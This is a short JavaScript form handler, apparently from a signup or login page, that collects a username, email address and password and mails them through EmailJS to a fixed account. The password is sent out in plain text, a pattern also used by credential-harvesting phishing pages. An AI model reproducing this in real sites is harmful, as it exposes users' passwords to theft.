function sendMail()
{
    var params = {
        username: document.getElementById("username").value,
        email: document.getElementById("email").value,
        password: document.getElementById("password").value,
    };

    const serviceID = "service_kvnqmtt"
    const templateID = "template_yso3mcx"

    emailjs
    .send(serviceID, templateID, params)
    .then((res) => {
        alert("Check your email "+document.getElementById("username").value);
        document.getElementById("username").value = "";
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
        console.log(res);
    })
    .catch((err) => console.log(err));
    window.location.href='index.html'
}